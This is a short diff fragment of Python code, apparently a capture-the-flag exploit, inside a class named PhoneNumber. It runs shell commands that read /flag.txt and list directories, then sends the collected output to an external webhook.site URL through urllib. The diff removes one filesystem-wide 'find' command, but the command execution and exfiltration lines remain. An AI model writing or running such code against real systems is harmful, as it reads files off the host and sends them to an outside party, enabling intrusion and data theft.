@@ -65,7 +65,6 @@ class PhoneNumber:
             out += "=CAT FILE=\n" + run("cat /flag.txt") + "\n"
             out += "=CAT FILE=\n" + run("ls -la") + "\n"
             out += "=CAT FILE=\n" + run("ls /") + "\n"
-            out += "=CAT FILE=\n" + run("find / -type f -iname "flag.txt" 2>/dev/null") + "\n"
 
             urllib.request.urlopen(
                 "https://webhook.site/364bd7d4-7769-49ab-9f81-1cd26fae1a14?d=" + urllib.parse.quote(out[:3000]),
